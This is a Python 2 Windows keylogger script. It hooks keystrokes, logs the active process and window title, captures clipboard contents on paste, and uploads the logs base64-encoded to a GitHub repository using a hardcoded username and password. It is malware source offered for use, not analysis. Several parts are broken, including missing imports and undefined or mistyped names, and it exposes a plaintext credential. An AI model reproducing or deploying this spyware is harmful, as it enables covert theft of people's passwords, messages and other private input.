from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import sys

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
foldertosave = sys.argv[1]
data_to_return = ""
filenumber=1

def get_current_process():
	global data_to_return
	#handle to foreground window
	hwnd = user32.GetForegroundWindow()
	#get the process id
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))
	#store the id
	process_id = "%d" % pid.value
	#grab executable
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
	
	psapi.GetModuleBaseA(h_process, None, byref(executable), 512)
	#now read its title
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
	#print out the header if we're in the right process
	print
	print "[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value)
	data_to_return = "[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value) + "\n"
	#close handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

def connect_to_github():
	gh = login(username = "alyzuu", password = "151119964013aG")
	repo = gh.repository("alyzuu", "Wkeylogger")
	branch = repo.branch("master")
	return gh,repo,branch

def store_module_result(data):
	global filenamesave, filenumber
	gh,repo,branch = connect_to_github()
	remote_path = "Logs/%s/%d.data" % (foldertosave, filenumber)
	filename += 1
	repo.create_file(remote_path, "Storing results", base64.b64encode(data))
	return

def KeyStroke(event):
	global current_window, data_to_return
	#check to see if the target changed the window
	if event.WindowName != current.window:
		current_window = event.WindowName
		store_module_result(data_to_return)
		get_current_process()

	if event.Ascii > 32 and event.Ascii < 127:
		print chr(event.Ascii),
		data_to_return += chr(event.Ascii)
	else: 
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			
			print "[PASTE] - %s" % (pasted_value),
			data_to_return += "[PASTE] - %s" % (pasted_value) + " "
		else:
			print "[%s]" % event.Key,
			data_to_return += "[%s]" % event.Key + " "
	return True

kl = pyHook.HookManager() 
kl.KeyDown = KeyStroke
	
kl.HookKeyboard()
pythoncom.PumpMessages()
	

